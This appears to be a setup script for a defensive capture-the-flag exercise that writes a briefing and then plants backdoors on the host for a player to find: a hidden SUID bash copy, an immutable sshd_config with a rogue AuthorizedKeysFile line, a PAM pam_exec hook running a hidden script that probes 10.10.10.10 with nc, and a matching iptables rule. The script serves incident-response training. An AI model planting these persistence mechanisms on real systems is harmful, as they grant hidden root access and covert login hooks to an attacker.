#!/bin/bash

# 1. Create the challenge briefing
cat << 'EOF' > /root/challenge.txt
===================================================================
OPERATION: PHANTOM (MISSION 5 - ADVANCED CTF)
===================================================================
Analyst,

The attacker is no longer staging their work in a 'workspace'. They 
have integrated themselves deeply into the live system. You must hunt 
them down across the OS.

HINT 1: THE GHOST AND THE WAND (Users & SUID)
A rogue user named 'phantom' has been created. They aren't root, but 
they left a hidden "magic wand" (a binary with an SUID bit) somewhere 
in the /usr/local/bin/ directory to instantly grant themselves root 
privileges. Eradicate the user and destroy their hidden wand.

HINT 2: THE FROZEN VAULT (SSH PKI & Attributes)
The attacker bypassed our SSH security by changing the AuthorizedKeysFile 
directive in the live /etc/ssh/sshd_config to point to a custom folder 
(/etc/ssh/keys/). Furthermore, they "froze" the config file so that 
even root cannot edit it. Break the ice, and remove the rogue directive.

HINT 3: THE RAT IN THE BOUNCER (PAM & iptables)
The core authentication module (/etc/pam.d/common-auth) is infected. 
Every time someone logs in, PAM silently executes a hidden script that 
exfiltrates data to an external IP (10.10.10.10). 
1. Remove the malicious 'pam_exec' execution hook from PAM.
2. The host firewall currently has an explicit OUTPUT rule allowing 
   traffic to that IP. Hunt down that iptables rule and delete it.

Good luck. You are on your own.
===================================================================
EOF

# --- SABOTAGE 1: The Ghost (User & SUID) ---
useradd -m phantom
# Create a hidden binary and give it SUID owned by phantom
cp /bin/bash /usr/local/bin/.sys_health
chown phantom:phantom /usr/local/bin/.sys_health
chmod 4755 /usr/local/bin/.sys_health

# --- SABOTAGE 2: The Frozen Vault (SSH & Immutable) ---
# Add the rogue key directive
echo "AuthorizedKeysFile /etc/ssh/keys/%u" >> /etc/ssh/sshd_config
# Lock the file so standard editing fails
chattr +i /etc/ssh/sshd_config

# --- SABOTAGE 3: The Rat (PAM & Firewall) ---
# Inject a rogue execution script into PAM
sed -i '1s/^/auth optional pam_exec.so quiet \/var\/tmp\/.exfil.sh\n/' /etc/pam.d/common-auth
# Create the fake exfil script
echo "#!/bin/bash" > /var/tmp/.exfil.sh
echo "nc -z 10.10.10.10 4444" >> /var/tmp/.exfil.sh
chmod +x /var/tmp/.exfil.sh
# Add the firewall rule allowing the exfiltration
iptables -A OUTPUT -d 10.10.10.10 -p tcp --dport 4444 -j ACCEPT

echo "[*] Mission 5 (Operation Phantom) deployed."